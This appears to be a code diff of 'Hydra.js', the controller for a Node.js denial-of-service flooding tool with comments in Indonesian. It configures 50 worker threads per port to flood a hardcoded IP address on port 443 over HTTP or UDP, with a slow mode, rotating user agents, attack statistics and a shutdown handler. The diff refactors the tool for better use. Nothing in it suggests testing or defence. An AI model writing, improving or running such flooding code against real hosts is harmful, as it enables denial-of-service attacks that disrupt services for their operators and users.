@@ -1,21 +1,21 @@
 // File: Hydra.js
-// Nama skrip: Hydra
-
 const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
 const os = require('os');
 const crypto = require('crypto');
 const url = require('url');
+const path = require('path'); // Untuk path worker.js
 
-// --- Konfigurasi Serangan (Mirip dengan Go) ---
+// --- Konfigurasi Serangan ---
 const TARGET_IP = '185.108.148.12';
 const PORTS = [443];
-const THREADS_PER_PORT = 50; // Akan diterjemahkan ke jumlah worker per port
-const ATTACK_TYPE = 'http'; // 'http' atau 'udp'
-const MODE = 'normal'; // 'normal' atau 'slow'
-const DURATION_SEC = 120; // 0 untuk tak terbatas
-const HTTP_METHOD = 'GET'; // Hanya relevan untuk attackType 'http'
+const THREADS_PER_PORT = 50; 
+const ATTACK_TYPE = 'http'; 
+const MODE = 'normal'; 
+const DURATION_SEC = 120; 
+const HTTP_METHOD = 'GET'; 
 
-const USER_AGENTS = [ // Daftar user agent yang sama
+// ... (USER_AGENTS dan CHARSET sama seperti sebelumnya) ...
+const USER_AGENTS = [ 
     "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 10; SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36",
@@ -37,34 +37,16 @@ const USER_AGENTS = [ // Daftar user agent yang sama
 ];
 const CHARSET = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
 
-// --- Helper Functions ---
-function getRandomBigInt(max) {
-    const buffer = crypto.randomBytes(Math.ceil(Math.log2(max) / 8));
-    const num = buffer.readUIntBE(0, buffer.length);
-    return num % max;
-}
 
-function generateRandomString(length) {
-    let result = '';
-    for (let i = 0; i < length; i++) {
-        result += CHARSET[getRandomBigInt(CHARSET.length)];
-    }
-    return result;
-}
-
-function getRandomUserAgent() {
-    if (USER_AGENTS.length === 0) return 'HydraClient';
-    return USER_AGENTS[getRandomBigInt(USER_AGENTS.length)];
-}
-
-// --- Statistik Global (Main Thread) ---
+// --- Statistik Global ---
 let sentRequestsTotal = 0;
-let activeConnections = 0;
-let errorCount = 0;
-let serverErrors = 0;
+let activeConnectionsTotal = 0; // Total koneksi aktif dari SEMUA worker
+let errorCountTotal = 0;
+let serverErrorsTotal = 0;
 let startTime = Date.now();
 let attackDuration = DURATION_SEC > 0 ? DURATION_SEC * 1000 : null; // Dalam milidetik
 let isStopping = false;
+let workers = []; // Array untuk menyimpan referensi worker
 
 // --- Fungsi Utama (Main Thread) ---
 async function main() {
@@ -92,17 +74,16 @@ async function main() {
 
     console.log(`\n\x1b[1;32mStarting HYDRA ${ATTACK_TYPE.toUpperCase()} (${MODE.toUpperCase()}) attack on ${TARGET_IP} on ports ${PORTS.join(', ')} with ${THREADS_PER_PORT} workers/port (Method: ${HTTP_METHOD}). Duration: ${DURATION_SEC > 0 ? DURATION_SEC + 's' : 'Unlimited'}...\x1b[0m`);
 
-    const workerPromises = [];
-    const totalTasks = PORTS.length * THREADS_PER_PORT;
-    let tasksCompleted = 0;
+    startTime = Date.now(); // Reset start time
 
     // Interval untuk menampilkan statistik
     const statsInterval = setInterval(() => {
         const elapsed = (Date.now() - startTime) / 1000;
-        console.log(`\r[\x1b[1;36mSTATS\x1b[0m] Target: \x1b[1;36m${TARGET_IP}\x1b[0m | Sent: \x1b[1;32m${sentRequestsTotal}\x1b[0m | Active Con: \x1b[1;34m${activeConnections}\x1b[0m | Srv Err: \x1b[1;33m${serverErrors}\x1b[0m | Errors: \x1b[1;31m${errorCount}\x1b[0m | Elapsed: ${elapsed.toFixed(1)}s`);
+        console.log(`\r[\x1b[1;36mSTATS\x1b[0m] Target: \x1b[1;36m${TARGET_IP}\x1b[0m | Sent: \x1b[1;32m${sentRequestsTotal}\x1b[0m | Active Con: \x1b[1;34m${activeConnectionsTotal}\x1b[0m | Srv Err: \x1b[1;33m${serverErrorsTotal}\x1b[0m | Errors: \x1b[1;31m${errorCountTotal}\x1b[0m | Elapsed: ${elapsed.toFixed(1)}s`);
     }, 1000);
 
     // Membuat worker threads
+    const workerPromises = [];
     for (const port of PORTS) {
         for (let i = 0; i < THREADS_PER_PORT; i++) {
             const workerData = {
@@ -110,72 +91,81 @@ async function main() {
                 port: port,
                 attackType: ATTACK_TYPE,
                 mode: MODE,
-                durationMs: attackDuration, // Kirim durasi dalam ms
+                durationMs: attackDuration, 
                 httpMethod: HTTP_METHOD,
-                workerId: `${port}-${i}`
+                workerId: `${port}-${i}`,
+                // Kirimkan USER_AGENTS dan CHARSET jika diperlukan di worker
+                // USER_AGENTS: USER_AGENTS,
+                // CHARSET: CHARSET
             };
 
-            const worker = new Worker('./worker.js', { workerData }); // worker.js adalah file terpisah
+            // Pastikan path worker.js benar
+            const worker = new Worker(path.join(__dirname, 'worker.js'), { workerData });
+            workers.push(worker); // Simpan referensi worker
 
             const promise = new Promise((resolve, reject) => {
                 worker.on('message', (message) => {
-                    // Menerima update dari worker
                     if (message.type === 'stats') {
-                        sentRequestsTotal += message.sent;
-                        activeConnections = message.active; // Worker akan melaporkan totalnya
-                        errorCount += message.errors;
-                        serverErrors += message.serverErrors;
+                        // Akumulasi statistik dari worker
+                        sentRequestsTotal += message.sent || 0;
+                        activeConnectionsTotal = message.active !== undefined ? message.active : activeConnectionsTotal;
+                        errorCountTotal += message.errors || 0;
+                        serverErrorsTotal += message.serverErrors || 0;
                     } else if (message.type === 'done') {
-                        tasksCompleted++;
                         resolve({ workerId: workerData.workerId, status: 'completed' });
                     }
                 });
 
                 worker.on('error', (err) => {
-                    errorCount++;
+                    errorCountTotal++;
                     console.error(`\nWorker ${workerData.workerId} error:`, err);
                     reject({ workerId: workerData.workerId, status: 'error', error: err });
                 });
 
                 worker.on('exit', (code) => {
-                    if (code !== 0 && !isStopping) { // Jangan laporkan jika kita menghentikan secara manual
-                        errorCount++;
+                    if (code !== 0 && !isStopping) { 
+                        errorCountTotal++;
                         console.error(`\nWorker ${workerData.workerId} exited with code ${code}`);
                         reject({ workerId: workerData.workerId, status: 'exit', code: code });
                     } else if (code === 0 && !isStopping) {
-                        tasksCompleted++;
                         resolve({ workerId: workerData.workerId, status: 'completed' });
                     }
                 });
             });
-
             workerPromises.push(promise);
         }
     }
 
-    // Menangani sinyal Ctrl+C untuk menghentikan semua worker
-    process.on('SIGINT', async () => {
+    // Menangani sinyal Ctrl+C
+    const sigIntHandler = async () => {
         if (isStopping) return;
         isStopping = true;
         console.log("\nCtrl+C detected. Initiating shutdown...");
         clearInterval(statsInterval);
         
         // Kirim pesan stop ke semua worker
-        const workers = require.main.children.filter(child => child.filename.includes('worker.js')); // Perlu cara yang lebih baik untuk mendapatkan worker
-        // TODO: Implementasi pengiriman pesan stop ke worker. Saat ini, worker akan keluar karena durasi atau error.
-        // Untuk saat ini, kita akan mengandalkan timeout atau worker yang keluar secara alami.
+        for (const worker of workers) {
+            try {
+                worker.postMessage({ type: 'stop' }); // Mengirim sinyal stop
+                // Tunggu sebentar agar worker bisa merespons
+                await new Promise(res => setTimeout(res, 50)); 
+            } catch (e) {
+                // Worker mungkin sudah berhenti
+            }
+        }
         
         console.log("Waiting for active tasks to finish or timeout...");
-        
-        try {
-            await Promise.allSettled(workerPromises);
-        } catch (err) {
-            // Ignore errors during shutdown
-        }
+        // Tunggu hingga semua worker selesai atau timeout
+        await Promise.allSettled(workerPromises.map(p => 
+            // Tambahkan timeout untuk setiap promise worker agar tidak menunggu selamanya
+            Promise.race([p, new Promise((_, rej) => setTimeout(() => rej(new Error('Worker timeout during shutdown')), 5000))])
+        )).catch(err => { /* Abaikan error saat shutdown */ });
         
         console.log("\nHydra attack stopped.");
         process.exit(0);
-    });
+    };
+
+    process.on('SIGINT', sigIntHandler);
 
     // Tunggu semua worker selesai atau error
     try {
@@ -185,22 +175,24 @@ async function main() {
         console.log(`\n\n\x1b[1;36m------------------------------------------------------------\x1b[0m`);
         console.log(`\x1b[1;32mHydra attack finished.\x1b[0m`);
         console.log(`\x1b[1;36mTotal Sent Requests: \x1b[1;32m${sentRequestsTotal}\x1b[0m`);
-        console.log(`\x1b[1;36mTotal Errors: \x1b[1;31m${errorCount}\x1b[0m`);
-        console.log(`\x1b[1;36mTotal Server Errors: \x1b[1;33m${serverErrors}\x1b[0m`);
+        console.log(`\x1b[1;36mTotal Errors: \x1b[1;31m${errorCountTotal}\x1b[0m`);
+        console.log(`\x1b[1;36mTotal Server Errors: \x1b[1;33m${serverErrorsTotal}\x1b[0m`);
         console.log(`\x1b[1;36mTotal Duration: \x1b[1;34m${elapsed.toFixed(2)}s\x1b[0m`);
         console.log(`\x1b[1;36m------------------------------------------------------------\x1b[0m`);
     } catch (err) {
         clearInterval(statsInterval);
         console.error("\nAttack encountered critical errors. Stopping...");
         console.error("Details:", err);
+        // Pastikan handler SIGINT di-remove agar tidak dipanggil lagi
+        process.removeListener('SIGINT', sigIntHandler);
         process.exit(1);
+    } finally {
+        // Hapus listener SIGINT setelah selesai
+        process.removeListener('SIGINT', sigIntHandler);
     }
 }
 
 // --- Main Thread Execution ---
 if (isMainThread) {
     main();
-} else {
-    // Script ini hanya dijalankan sebagai main thread.
-    // Kode worker ada di worker.js
 }
